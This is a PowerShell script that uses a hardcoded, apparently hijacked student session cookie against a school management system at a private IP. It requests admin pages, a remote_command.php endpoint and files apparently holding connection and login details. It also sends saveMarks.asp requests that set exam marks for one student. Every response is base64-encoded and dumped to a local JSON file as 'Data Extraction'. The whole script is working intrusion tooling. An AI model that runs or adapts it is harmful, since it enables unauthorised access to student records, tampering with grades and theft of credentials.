# --- Configuration ---
$BaseUrl    = "http://192.168.29.20"
$UserAgent  = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
$Cookie     = "admNoE=%C7%0D%90%E6%E8; fyE=%C4%0A%97%E2; loginByE=%A5N%D0%B3%B8%23%08; admNo=17515; fy=2025; loginBy=Student; ASPSESSIONIDSGDQBRST=KLINOGAALHLGDGJMFOENPAPD; ASPSESSIONIDCWCTBRTR=OCIDGFEDKGEJHBDELDIAPDKI; ASPSESSIONIDQGCRASTT=KBBMGGNBIDIBADOIHEDIHDCP; ASPSESSIONIDAERRDSST=JIMDBBIBJPHDPIEOLJMHEKMA; userno=1; lock=none; _gid=GA1.2.1932742890.1772021591; userno=1; fy=2025; usernoT=jXycB19tcRyJD3LguLToZbBvdfyJ%2BLiKzIIlSoz0PFLqgddd2Ufoad7x6VPZAB3OXObTIowXsQDWkBsnHGYKZw%3D%3D; fyT=B0%2FrbDxWkgqbNNx35RCvqVFiWwnid5j6BIx8jPC%2FgGylGzOut0gbS2dOm1Jt5uyuH5Gx5uVbs8khxUzY8HYmqw%3D%3D; PHPSESSID=bbli5lj6rr861a63rgmj17fcv9; ASPSESSIONIDAWQSCRSQ=FICOGLBDKEEILOEJKHGOFGCF"
$Timeout    = 120 
$OutputFile = Join-Path $env:TEMP "Internal_Crawl_$(Get-Date -Format 'yyyyMMdd_HHmm').json"

# Fixed list: No trailing comma on the final item
$Paths = @(
    "/",
    "/schoolexpert",
    "/schoolexpert/mstrUsers.asp",
    "/schoolexpert/saveMarks.asp",
    "/schoolexpert/saveMarks.asp?marksObt=19&adm_no=18887&maxMarks=25&subExam=Weekly%20Test-1&st_subject=English&examName=Term-2&fy=2025&userNo=1",
    "/schoolexpert/saveMarks.asp?marksObt=74&adm_no=18887&maxMarks=80&subExam=Yearly%20Exam&st_subject=SOCIAL%20SCIENCE&examName=Term-2&fy=2025&userNo=1",
    "/schoolexpert/remote_command.php",
    "/schoolexpert/js/progressSMS.js",
    "/schoolexpert/connection.txt",
    "/schoolexpert/StudentloginCheck.txt",
    "/schoolexpert/schoolDetails.txt",
    "/schoolexpert/examMarksEntry4.asp",
    "/schoolexpert/SELibrary.txt",
    "/schoolexpert/loginCheck.txt"
)

$Headers = @{
    "User-Agent" = $UserAgent
    "Cookie"     = $Cookie
    "Referer"    = "$BaseUrl/schoolexpert"
}

$AllResults = @()

Write-Host "Starting Data Extraction..." -ForegroundColor Cyan
Write-Host "Target: $BaseUrl"
Write-Host "Timeout set to $Timeout seconds per request."

foreach ($Path in $Paths) {
    $FullUrl = "$BaseUrl$Path"
    
    $Entry = [ordered]@{
        url           = $FullUrl
        timestamp     = (Get-Date).ToString("o")
        status_code   = 0
        content_found = $false
        base64_body   = ""
        error         = ""
    }

    try {
        # Perform request with 2-minute timeout
        $Response = Invoke-WebRequest -Uri $FullUrl -Headers $Headers -Method Get -UseBasicParsing -TimeoutSec $Timeout -ErrorAction Stop
        
        $Entry.status_code   = [int]$Response.StatusCode
        $Entry.content_found = $true
        
        # Convert response to Base64 to safely handle all data types
        $RawBytes = $Response.Content
        if ($RawBytes -is [string]) {
            $RawBytes =[System.Text.Encoding]::UTF8.GetBytes($RawBytes)
        }
        $Entry.base64_body = [Convert]::ToBase64String($RawBytes)
        
        Write-Host "Successfully captured: $Path" -ForegroundColor Green
    } catch {
        $Entry.content_found = $false
        $Entry.error         = $_.Exception.Message
        if ($_.Exception.Response) {
            $Entry.status_code = [int]$_.Exception.Response.StatusCode
        }
        Write-Host "Failed: $Path - $($Entry.error)" -ForegroundColor Red
    }

    $AllResults += $Entry
}

# Consolidate all data into the single JSON file
try {
    $AllResults | ConvertTo-Json -Depth 10 | Set-Content -Path $OutputFile -Encoding UTF8
    Write-Host "`nProcessing Complete." -ForegroundColor Cyan
    Write-Host "Data saved to: " -NoNewline
    Write-Host $OutputFile -ForegroundColor Yellow
} catch {
    Write-Host "Save Error: $($_.Exception.Message)" -ForegroundColor Red
}
